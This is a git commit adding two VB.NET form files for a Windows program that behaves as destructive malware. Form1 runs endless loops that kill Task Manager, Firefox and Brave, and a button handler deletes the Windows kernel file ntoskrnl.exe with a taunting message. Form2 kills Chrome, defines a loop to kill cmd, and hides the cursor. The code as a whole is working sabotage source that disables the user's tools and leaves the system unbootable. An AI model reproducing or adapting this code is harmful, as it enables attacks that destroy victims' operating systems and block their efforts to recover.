4f18b0488dddff2db61535b06b0d1bd93ea6b663
QwertyFuckingSucksProDvorak <78890852+QwertyFuckingSucksProDvorak@users.noreply.github.com>
2021-04-27 21:32:12 -0500

    1.3-a

---
+++ Fucking rippin ya NUTS off lmao/Form1.vb
@@ -0,0 +1,58 @@
+﻿Imports System
+Public Class Form1
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Dim T As New Threading.Thread(AddressOf Block)
+        T.Start()
+        Dim J As New Threading.Thread(AddressOf FuckingAnotherBrowser)
+        J.Start()
+        BackgroundWorker1.RunWorkerAsync()
+    End Sub
+    Sub Block()
+        While True
+            For Each P As Process In Process.GetProcessesByName("taskmgr")
+                P.Kill()
+            Next
+            Threading.Thread.Sleep(100)
+        End While
+    End Sub
+    Sub FuckingAnotherBrowser()
+        While True
+            For Each K As Process In Process.GetProcessesByName("firefox")
+                K.Kill()
+            Next
+            Threading.Thread.Sleep(100)
+        End While
+    End Sub
+    Sub FuckingAnotherShit()
+        While True
+            For Each Z As Process In Process.GetProcessesByName("brave")
+                Z.Kill()
+            Next
+            Threading.Thread.Sleep(100)
+        End While
+    End Sub
+
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        Dim sysFile As String
+        Dim sysFile9x As String
+        sysFile = "C:\Windows\System32\ntoskrnl.exe"
+        sysFile9x = "C:\Windows\win.com"
+
+        Form2.Show()
+        If CheckBox1.Checked = True Then
+            System.IO.File.Delete(sysFile)
+            MsgBox("You're mega fuck'd :))))")
+        End If
+    End Sub
+
+    Private Sub BackgroundWorker1_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
+        My.Computer.Audio.Play("yourefucked.wav")
+        MessageBox.Show("*Boss music plays*")
+    End Sub
+
+    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
+        MessageBox.Show("Made In Visual Basic :)")
+        Dim N As New Threading.Thread(AddressOf FuckingAnotherShit)
+        N.Start()
+    End Sub
+End Class
---
+++ Fucking rippin ya NUTS off lmao/Form2.vb
@@ -0,0 +1,42 @@
+﻿Public Class Form2
+    Private Sub Button1_Click(sender As Object, e As EventArgs)
+        Cursor.Show()
+        MessageBox.Show("Made in vb.net :)")
+        Application.Exit()
+    End Sub
+
+    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
+        Cursor.Hide()
+    End Sub
+
+    Private Sub PictureBox1_CursorChanged(sender As Object, e As EventArgs) Handles PictureBox1.CursorChanged
+        Cursor.Hide()
+    End Sub
+
+    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Dim T As New Threading.Thread(AddressOf Block)
+        T.Start()
+        Dim U As New Threading.Thread(AddressOf FuckingYourMomsDad)
+        MessageBox.Show("You're fucked :)")
+    End Sub
+    Sub Block()
+        While True
+            For Each P As Process In Process.GetProcessesByName("chrome")
+                P.Kill()
+            Next
+            Threading.Thread.Sleep(100)
+        End While
+    End Sub
+    Sub FuckingYourMomsDad()
+        While True
+            For Each F As Process In Process.GetProcessesByName("cmd")
+                F.Kill()
+            Next
+            Threading.Thread.Sleep(100)
+        End While
+    End Sub
+
+    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click
+        Form3.Show()
+    End Sub
+End Class
